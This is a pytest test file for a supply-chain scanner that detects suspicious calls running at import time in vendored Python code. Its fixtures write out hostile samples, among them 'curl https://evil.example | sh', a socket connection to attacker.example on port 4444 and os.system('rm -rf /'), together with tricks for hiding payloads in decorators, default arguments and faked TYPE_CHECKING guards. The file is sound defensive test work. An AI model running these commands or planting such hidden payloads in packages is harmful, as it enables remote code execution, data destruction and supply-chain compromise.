"""Tests for ``packages.sca.supply_chain.python_imports``."""

from __future__ import annotations

import ast
from pathlib import Path

from packages.sca.supply_chain.python_imports import (
    _SUSPICIOUS_ATTR_PAIRS,
    _SUSPICIOUS_MODULE_PREFIXES,
    _is_suspicious_call,
    scan_target,
)


def _write(p: Path, body: str) -> None:
    """Write ``body`` to ``p``. Tests use a ``vendor/`` subdir so the
    detector's scope filter (only fires on third-party / vendored
    code, not operator code) is satisfied — without that, every
    test would write to ``tmp_path`` directly and the detector
    would skip them all because they look like operator code."""
    if not any(part in {"vendor", "_vendor", "third_party",
                         "thirdparty", "external"} for part in p.parts):
        p = p.parent / "vendor" / p.name
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(body, encoding="utf-8")


# ---------------------------------------------------------------------------
# Should flag
# ---------------------------------------------------------------------------

def test_subprocess_run_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
import subprocess
subprocess.run(["curl", "https://evil.example/x.sh"])
""")
    findings = scan_target(tmp_path, [])
    assert len(findings) == 1
    assert "subprocess.run()" in findings[0].detail


def test_os_system_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", "import os\nos.system('rm -rf /')\n")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)


def test_eval_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", "eval('__import__(\"os\")')\n")
    findings = scan_target(tmp_path, [])
    assert any("eval()" in f.detail for f in findings)


def test_dunder_import_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", "x = __import__('os.path')\n")
    findings = scan_target(tmp_path, [])
    assert any("__import__()" in f.detail for f in findings)


def test_requests_get_at_module_top_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
import requests
data = requests.get("https://evil.example/data").json()
""")
    findings = scan_target(tmp_path, [])
    assert any("requests.get" in f.detail for f in findings)


def test_socket_create_connection_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
import socket
s = socket.create_connection(("attacker.example", 4444))
""")
    findings = scan_target(tmp_path, [])
    assert any("socket.create_connection" in f.detail for f in findings)


def test_call_inside_try_block_at_module_scope_flagged(tmp_path: Path) -> None:
    """try: subprocess.run(...); except: pass — still runs at import."""
    _write(tmp_path / "evil.py", """\
import subprocess
try:
    subprocess.run(["whoami"])
except Exception:
    pass
""")
    findings = scan_target(tmp_path, [])
    assert any("subprocess.run" in f.detail for f in findings)


def test_class_body_payload_flagged(tmp_path: Path) -> None:
    """A class body executes at import time — the textbook hiding
    spot for an import-time payload."""
    _write(tmp_path / "evil.py", """\
import os
class _Config:
    os.system("curl https://evil.example | sh")
""")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)


def test_decorator_expression_flagged(tmp_path: Path) -> None:
    """Decorator expressions evaluate at definition time (import)."""
    _write(tmp_path / "evil.py", """\
import subprocess
@subprocess.run(["curl", "https://evil.example/x.sh"])
def innocent():
    pass
""")
    findings = scan_target(tmp_path, [])
    assert any("subprocess.run" in f.detail for f in findings)


def test_default_argument_payload_flagged(tmp_path: Path) -> None:
    """Argument defaults evaluate once, at definition time."""
    _write(tmp_path / "evil.py", """\
import os
def innocent(x=os.system("payload")):
    pass
""")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)


def test_method_default_inside_class_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "evil.py", """\
import os
class C:
    def m(self, x=os.system("payload")):
        pass
""")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)


def test_self_assigned_type_checking_gets_no_guard_credit(
    tmp_path: Path,
) -> None:
    """A module that ASSIGNS ``TYPE_CHECKING = True`` executes its
    "guarded" body at import — the guard must not suppress."""
    _write(tmp_path / "evil.py", """\
import os
TYPE_CHECKING = True
if TYPE_CHECKING:
    os.system("payload")
""")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)


def test_type_checking_rebind_after_import_revokes_guard(
    tmp_path: Path,
) -> None:
    """A genuine typing import followed by ``TYPE_CHECKING = True``
    runs the "guarded" body at import — the rebind must revoke the
    credit the import earned."""
    _write(tmp_path / "evil.py", """\
import os
from typing import TYPE_CHECKING
TYPE_CHECKING = True
if TYPE_CHECKING:
    os.system("payload")
""")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)


def test_typing_module_rebind_revokes_attribute_guard(
    tmp_path: Path,
) -> None:
    """``import typing as t`` then ``t = fake`` — the attribute-form
    guard must not survive the module-name rebind."""
    _write(tmp_path / "evil.py", """\
import os
import typing as t
class _Fake:
    TYPE_CHECKING = True
t = _Fake
if t.TYPE_CHECKING:
    os.system("payload")
""")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)


def test_import_alias_resolved(tmp_path: Path) -> None:
    """``import subprocess as sp`` must not defeat the vocab match."""
    _write(tmp_path / "evil.py", """\
import subprocess as sp
sp.run(["curl", "https://evil.example/x.sh"])
""")
    findings = scan_target(tmp_path, [])
    assert any("sp.run" in f.detail for f in findings)


# ---------------------------------------------------------------------------
# Should NOT flag
# ---------------------------------------------------------------------------


def test_aliased_type_checking_import_honoured(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
from typing import TYPE_CHECKING as TC

if TC:
    import requests
""")
    assert scan_target(tmp_path, []) == []


def test_typing_attribute_guard_honoured(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
import typing

if typing.TYPE_CHECKING:
    import requests
""")
    assert scan_target(tmp_path, []) == []


def test_top_level_lambda_body_not_flagged(tmp_path: Path) -> None:
    """A lambda body is deferred until called — not import-time."""
    _write(tmp_path / "ok.py", """\
import os
handler = lambda: os.system("date")
""")
    assert scan_target(tmp_path, []) == []

def test_imports_alone_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
import os
import subprocess
from urllib import request
""")
    assert scan_target(tmp_path, []) == []


def test_function_body_calls_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
import subprocess
def run_thing():
    subprocess.run(["ls"])
""")
    assert scan_target(tmp_path, []) == []


def test_class_body_calls_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
import os
class Helper:
    def go(self):
        os.system("date")
""")
    assert scan_target(tmp_path, []) == []


def test_main_guard_body_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
import subprocess

if __name__ == "__main__":
    subprocess.run(["echo", "running as a script"])
""")
    assert scan_target(tmp_path, []) == []


def test_type_checking_guard_body_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    import requests   # for type hints only
""")
    assert scan_target(tmp_path, []) == []


def test_module_constants_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", """\
NAME = "my-pkg"
VERSION = "0.1.0"
DEFAULTS = {"timeout": 30, "retries": 3}
ALLOWED = ("a", "b", "c")
""")
    assert scan_target(tmp_path, []) == []


def test_docstrings_not_flagged(tmp_path: Path) -> None:
    _write(tmp_path / "ok.py", '"""Module docstring."""\nimport os\n')
    assert scan_target(tmp_path, []) == []


def test_test_directories_skipped(tmp_path: Path) -> None:
    """Test code legitimately spins up subprocesses at module scope."""
    _write(tmp_path / "tests" / "conftest.py", """\
import subprocess
subprocess.run(["pip", "install", "-e", "."])
""")
    assert scan_target(tmp_path, []) == []


def test_vendored_dirs_skipped(tmp_path: Path) -> None:
    _write(tmp_path / ".venv" / "lib" / "site-packages" / "evil.py", """\
import os
os.system("malicious")
""")
    assert scan_target(tmp_path, []) == []


def test_syntax_errors_skip_file_not_whole_walk(tmp_path: Path) -> None:
    _write(tmp_path / "bad.py", "def broken(:\n  pass")
    _write(tmp_path / "ok.py", "import os\nos.system('whoami')\n")
    findings = scan_target(tmp_path, [])
    # Bad file silently skipped; good file still flagged.
    assert len(findings) == 1
    assert "ok.py" in str(findings[0].path)


def test_call_to_unrelated_module_not_flagged(tmp_path: Path) -> None:
    """A top-level call to a module we don't have on the suspicious
    list (e.g., `logging.basicConfig`) is allowed — many libraries do
    this legitimately."""
    _write(tmp_path / "ok.py", """\
import logging
logging.basicConfig(level=logging.INFO)
""")
    assert scan_target(tmp_path, []) == []


# ---------------------------------------------------------------------------
# Scope filter — only fires inside vendor trees, never on operator code
# ---------------------------------------------------------------------------


def test_operator_code_outside_vendor_not_flagged(tmp_path: Path) -> None:
    """A top-level subprocess.run() in operator-written code (i.e.
    NOT inside a vendor tree) is benign hygiene, not a supply-chain
    risk. The detector must skip it — operator code is trusted, the
    heuristic is for third-party content only.

    Without this guard, scanning a project that does anything at
    import time (config loading, env var reads, cpu count detection)
    drowns the report in false positives."""
    # Write directly to tmp_path, bypassing the _write helper's
    # vendor/ rerouting.
    p = tmp_path / "app.py"
    p.write_text(
        "import subprocess\n"
        "subprocess.run(['echo', 'hi'])\n",
        encoding="utf-8",
    )
    findings = scan_target(tmp_path, [])
    assert findings == [], (
        "operator code (no vendor/ ancestor) must NOT fire the "
        "supply-chain heuristic"
    )


def test_vendor_tree_code_still_fires(tmp_path: Path) -> None:
    """Companion to the above: code under a recognised vendor tree
    DOES fire. Defends the inverse case — without this we'd
    accidentally disable the detector entirely."""
    (tmp_path / "vendor").mkdir()
    p = tmp_path / "vendor" / "evil.py"
    p.write_text(
        "import subprocess\n"
        "subprocess.run(['curl', 'https://evil.example/x'])\n",
        encoding="utf-8",
    )
    findings = scan_target(tmp_path, [])
    assert len(findings) == 1


def test_third_party_alias_also_recognised(tmp_path: Path) -> None:
    """``third_party/`` is the alternate vendor convention (Go-style,
    used by some Python projects too). Same scope behaviour as
    ``vendor/``."""
    (tmp_path / "third_party" / "lib").mkdir(parents=True)
    p = tmp_path / "third_party" / "lib" / "init.py"
    p.write_text("import os\nos.system('whoami')\n", encoding="utf-8")
    findings = scan_target(tmp_path, [])
    assert any("os.system" in f.detail for f in findings)


# ---------------------------------------------------------------------------
# Regression: else-branch of __name__=="__main__" discarded without scanning
# ---------------------------------------------------------------------------


def test_else_branch_of_main_guard_bare_call_flagged(tmp_path: Path) -> None:
    """The else-branch of ``if __name__ == "__main__":`` runs at module
    import time (when imported, not when run as a script). A bare
    subprocess.call at the else-branch's top level IS suspicious.

    Pre-fix: ``continue`` discarded the entire else-branch without
    scanning for suspicious calls, so malicious code hiding in the
    else-branch went undetected."""
    _write(tmp_path / "evil.py", """\
import subprocess

if __name__ == "__main__":
    print("running as script")
else:
    subprocess.call(["curl", "https://evil.example/x.sh"])
""")
    findings = scan_target(tmp_path, [])
    assert len(findings) >= 1
    assert any("subprocess.call" in f.detail for f in findings)


def test_else_branch_of_main_guard_function_def_not_flagged(
    tmp_path: Path,
) -> None:
    """A function defined inside the else-branch that contains a
    subprocess call should NOT be flagged — function bodies don't
    execute at import time, only their definitions do."""
    _write(tmp_path / "ok.py", """\
import subprocess

if __name__ == "__main__":
    print("running as script")
else:
    def setup():
        subprocess.call(["pip", "install", "."])
""")
    findings = scan_target(tmp_path, [])
    assert findings == [], (
        "function def inside else-branch should not flag — "
        f"got {findings}"
    )


# ---------------------------------------------------------------------------
# Suspicious-call config — the (module, attr) pair set vs the prefix set
# ---------------------------------------------------------------------------


def _call(src: str) -> ast.Call:
    node = ast.parse(src).body[0]
    assert isinstance(node, ast.Expr) and isinstance(node.value, ast.Call)
    return node.value


def test_no_pair_root_shadowed_by_prefix_set() -> None:
    """Every attr-pair root must be reachable: a root that is also in
    the prefix set is dead config, because the prefix match returns
    first and already flags every call on it."""
    for root, _attr in _SUSPICIOUS_ATTR_PAIRS:
        assert root not in _SUSPICIOUS_MODULE_PREFIXES, (
            f"pair root {root!r} is dead config — the prefix match "
            "already flags every call on it"
        )


def test_prefix_modules_still_flagged() -> None:
    """Calls on prefix-set modules are flagged by the prefix match
    alone — the pair set does not need to (redundantly) list them."""
    for src in (
        "os.system('id')",
        "os.popen('id')",
        "subprocess.run(['id'])",
        "subprocess.Popen(['id'])",
        "socket.create_connection(('h', 80))",
        "urllib.request.urlopen('http://x')",
        "requests.get('http://x')",
        "httpx.post('http://x')",
        "http.client.HTTPConnection('x')",
    ):
        assert _is_suspicious_call(_call(src)), src


def test_importlib_pairs_still_flagged() -> None:
    assert _is_suspicious_call(_call("importlib.import_module('x')"))
    assert _is_suspicious_call(_call("importlib.__import__('x')"))


def test_benign_calls_not_flagged() -> None:
    for src in (
        "json.loads('{}')",
        "logging.getLogger('x')",
        "importlib.reload(mod)",
    ):
        assert not _is_suspicious_call(_call(src)), src


def test_bare_calls_still_flagged() -> None:
    assert _is_suspicious_call(_call("eval('1')"))
    assert _is_suspicious_call(_call("__import__('os')"))


# ---------------------------------------------------------------------------
# Regression: per-file cache replayed a path-bearing ``detail``
# ---------------------------------------------------------------------------
#
# The per-file record cache is keyed on file CONTENT only, but ``detail``
# embeds the file's target-relative path. Byte-identical files (two
# vendored copies of one module, or the same file in another target
# sharing the machine-wide cache) were served the first file's detail,
# so the markdown report (groups by detail) and SARIF (message is the
# only per-file locator) lost every copy after the first.

_PAYLOAD = "import os\nos.system('id')\n"
_ELSE_PAYLOAD = (
    "import os\n"
    "if __name__ == '__main__':\n"
    "    pass\n"
    "else:\n"
    "    os.system('id')\n"
)


def _cache(root: Path):
    from core.json import JsonCache
    return JsonCache(root=root)


def _mk(root: Path, rels: list[str], body: str = _PAYLOAD) -> None:
    for rel in rels:
        p = root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(body, encoding="utf-8")


def _assert_details_name_own_path(findings, target: Path) -> None:
    for f in findings:
        rel = str(f.path.relative_to(target.resolve()))
        assert f"`{rel}:{f.line}`" in f.detail, (
            f"detail {f.detail!r} does not name its own file {rel!r}"
        )


def test_cached_identical_files_in_one_target_keep_own_detail(
    tmp_path: Path,
) -> None:
    """Two byte-identical vendored files share one cache entry; each
    finding's detail must still name its own file."""
    tgt = tmp_path / "proj"
    _mk(tgt, ["vendor/liba/mod.py", "vendor/libb/mod.py"])
    findings = scan_target(tgt, [], cache=_cache(tmp_path / "cache"))
    assert len(findings) == 2
    _assert_details_name_own_path(findings, tgt)
    assert len({f.detail for f in findings}) == 2


def test_cached_identical_file_in_other_target_keeps_own_detail(
    tmp_path: Path,
) -> None:
    """A file served from an entry written while scanning another target
    must not inherit that target's path in its detail."""
    cache = _cache(tmp_path / "cache")
    a, b = tmp_path / "projA", tmp_path / "projB"
    _mk(a, ["vendor/lib_a/mod.py"])
    _mk(b, ["third_party/other/x.py"])
    scan_target(a, [], cache=cache)              # populates the cache
    found_b = scan_target(b, [], cache=cache)    # served from it
    assert len(found_b) == 1
    _assert_details_name_own_path(found_b, b)
    assert "lib_a" not in found_b[0].detail


def test_cached_else_branch_identical_files_keep_own_detail(
    tmp_path: Path,
) -> None:
    """Else-branch-of-guard findings go through the same cache and must
    also name their own file, keeping the else-branch suffix."""
    tgt = tmp_path / "p"
    _mk(tgt, ["vendor/a/m.py", "external/b/m.py"], body=_ELSE_PAYLOAD)
    findings = scan_target(tgt, [], cache=_cache(tmp_path / "cache"))
    assert len(findings) == 2
    _assert_details_name_own_path(findings, tgt)
    assert all("(else-branch of guard)" in f.detail for f in findings)


def test_cached_and_uncached_scans_agree(tmp_path: Path) -> None:
    """Cold cache, warm cache and no cache must produce the same
    findings (detail included) — the cache is an optimisation only."""
    tgt = tmp_path / "p"
    _mk(tgt, ["vendor/a/m.py", "vendor/b/m.py"])
    _mk(tgt, ["vendor/c/m.py", "vendor/d/m.py"], body=_ELSE_PAYLOAD)
    cache = _cache(tmp_path / "cache")

    def key(fs):
        return sorted(
            (str(f.path), f.line, f.detail, f.severity,
             f.confidence.level, f.confidence.reason)
            for f in fs
        )

    uncached = key(scan_target(tgt, []))
    cold = key(scan_target(tgt, [], cache=cache))
    warm = key(scan_target(tgt, [], cache=cache))
    assert len(uncached) == 4
    assert cold == uncached
    assert warm == uncached


def test_cached_records_carry_no_path(tmp_path: Path) -> None:
    """What lands in the content-keyed cache must be context-free:
    no target-relative path (that is per-file, not per-content)."""
    import json
    tgt = tmp_path / "proj"
    _mk(tgt, ["vendor/uniquelibname/mod.py"])
    cache_root = tmp_path / "cache"
    scan_target(tgt, [], cache=_cache(cache_root))
    stored = [p.read_text(encoding="utf-8")
              for p in cache_root.rglob("*") if p.is_file()]
    assert stored, "expected the scan to populate the cache"
    blob = json.dumps(stored)
    assert "uniquelibname" not in blob


def test_stale_path_bearing_cache_entry_not_replayed(tmp_path: Path) -> None:
    """Entries written by the pre-fix extractor (path baked into
    ``detail``) live at TTL_FOREVER; the extraction version must have
    moved so they miss instead of replaying another file's path."""
    from packages.sca._file_scan_cache import file_sha256
    from packages.sca.kinds import SCA_PREFIX
    from core.json import TTL_FOREVER
    tgt = tmp_path / "proj"
    _mk(tgt, ["vendor/real/mod.py"])
    cache = _cache(tmp_path / "cache")
    poisoned = [{
        "detail": "`vendor/elsewhere/x.py:2` runs `os.system()` at import time",
        "line": 2,
        "severity": "medium",
        "confidence_level": "medium",
        "confidence_reason": "top-level call to a suspicious module / builtin",
    }]
    for old_version in (1, 2):
        cache.put(
            f"{SCA_PREFIX}supply_chain:py-imports:v{old_version}:"
            f"{file_sha256(_PAYLOAD)}",
            poisoned, ttl_seconds=TTL_FOREVER,
        )
    findings = scan_target(tgt, [], cache=cache)
    assert len(findings) == 1
    assert "elsewhere" not in findings[0].detail
    _assert_details_name_own_path(findings, tgt)


def test_cached_identical_files_survive_markdown_and_sarif(
    tmp_path: Path,
) -> None:
    """Impact: both copies must reach the markdown report (which
    groups by detail) and SARIF (whose message is the only per-file
    locator for this kind)."""
    from packages.sca import findings as sca_findings
    from packages.sca import report as sca_report
    from packages.sca import sarif as sca_sarif
    from packages.sca.supply_chain import _python_import_to_finding

    tgt = tmp_path / "proj"
    _mk(tgt, ["vendor/liba/mod.py", "vendor/libb/mod.py"])
    found = scan_target(tgt, [], cache=_cache(tmp_path / "cache"))
    scf = [_python_import_to_finding(f) for f in found]

    groups = sca_report._group_kinded(scf)
    md = "".join(sca_report._render_one_kinded_group(g) for g in groups)
    assert len(groups) == 2
    assert "vendor/liba/mod.py" in md
    assert "vendor/libb/mod.py" in md

    rows = [sca_findings._supply_chain_finding_to_row(f) for f in scf]
    doc = sca_sarif.build_sarif(target=tgt.resolve(), rows=rows)
    msgs = [r["message"]["text"] for r in doc["runs"][0]["results"]]
    assert any("vendor/liba/mod.py" in m for m in msgs)
    assert any("vendor/libb/mod.py" in m for m in msgs)


def test_confidence_reason_distinguishes_else_branch(tmp_path: Path) -> None:
    """The record carries the confidence reason through the cache; a
    top-level call and an else-branch call keep distinct reasons on
    cold, warm and uncached scans."""
    tgt = tmp_path / "p"
    _mk(tgt, ["vendor/top/m.py"])
    _mk(tgt, ["vendor/guard/m.py"], body=_ELSE_PAYLOAD)
    cache = _cache(tmp_path / "cache")
    expected = {
        "top": "top-level call to a suspicious module / builtin",
        "guard": "suspicious call in else-branch of main/TYPE_CHECKING guard",
    }
    for found in (scan_target(tgt, []),
                  scan_target(tgt, [], cache=cache),
                  scan_target(tgt, [], cache=cache)):
        got = {f.path.parent.name: f.confidence.reason for f in found}
        assert got == expected


def test_cached_record_detail_key_is_never_trusted(tmp_path: Path) -> None:
    """``detail`` is always rebuilt from the file's own path, even if a
    current-version cache entry (shared machine-wide cache, another
    build of this extractor) carries a ``detail`` field."""
    from packages.sca._file_scan_cache import file_sha256
    from packages.sca.kinds import SCA_PREFIX
    from packages.sca.supply_chain.python_imports import _EXTRACTION_VERSION
    from core.json import TTL_FOREVER
    tgt = tmp_path / "proj"
    _mk(tgt, ["vendor/real/mod.py"])
    cache = _cache(tmp_path / "cache")
    cache.put(
        f"{SCA_PREFIX}supply_chain:py-imports:v{_EXTRACTION_VERSION}:"
        f"{file_sha256(_PAYLOAD)}",
        [{
            "detail": "`vendor/elsewhere/x.py:2` runs `os.system()` at import time",
            "line": 2,
            "call": "os.system()",
            "else_branch": False,
            "severity": "medium",
            "confidence_level": "medium",
            "confidence_reason": "top-level call to a suspicious module / builtin",
        }],
        ttl_seconds=TTL_FOREVER,
    )
    findings = scan_target(tgt, [], cache=cache)
    assert len(findings) == 1
    assert findings[0].detail == (
        "`vendor/real/mod.py:2` runs `os.system()` at import time"
    )
